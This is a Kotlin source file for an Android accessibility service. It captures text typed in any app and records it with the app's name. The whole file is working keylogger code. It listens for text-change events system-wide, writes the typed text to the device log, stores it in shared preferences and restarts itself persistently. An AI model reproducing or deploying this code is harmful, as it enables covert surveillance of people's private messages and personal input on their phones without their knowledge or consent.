package com.example.accessibilityserviceapp

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.content.pm.PackageManager.NameNotFoundException
import android.util.Log
import android.view.accessibility.AccessibilityEvent

@Suppress("DEPRECATION")
class MyAccessibiltyService : AccessibilityService() {

    private val tag = "MyAccessibilityService"
    private lateinit var applicationLabel: CharSequence

    // running the service in background forever even when killed by system it restarts again.
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    @SuppressLint("SwitchIntDef")
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {

        Log.e(tag, "onAccessibilityEvent: ")

        when(event?.eventType){
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {

                // getting the name of the app
                getNameOfApp(event)

                // sending the text and name of app to shared preferences function
                val text = event.text.joinToString(separator = "") { it.toString() }
                saveTextToSharedPreferences(text,applicationLabel)
            }
        }
    }

    override fun onInterrupt() {
        Log.e(tag, "onInterrupt: Something Went Wrong")
    }

    override fun onServiceConnected() {
        val config = AccessibilityServiceInfo()
        config.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
        config.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
        config.flags = AccessibilityServiceInfo.DEFAULT
        serviceInfo = config

        Log.e(tag, "onServiceConnected: " )
    }

    // saving the data in shared preference as key-value pair
    // where key = app name and value = text
    private fun saveTextToSharedPreferences(text: String?, applicationLabel: CharSequence) {
        val sharedPreferences = applicationContext.getSharedPreferences("MySharedPreferences", Context.MODE_PRIVATE)
        sharedPreferences.edit().putString(applicationLabel as String?, text).apply()
        Log.d("database", "saveTextToSharedPreferences: $text")
    }

    // get name of the app
    private fun getNameOfApp(event: AccessibilityEvent) {
        val packageName : String = event.packageName.toString()
        val packageManager : PackageManager = this.packageManager

        try {
            val applicationInfo: ApplicationInfo = packageManager.getApplicationInfo(packageName,0)
            applicationLabel= packageManager.getApplicationLabel(applicationInfo)

            Log.e(tag, "App Name is $applicationLabel")
        }catch (e : NameNotFoundException) {
            e.printStackTrace()
        }
    }
}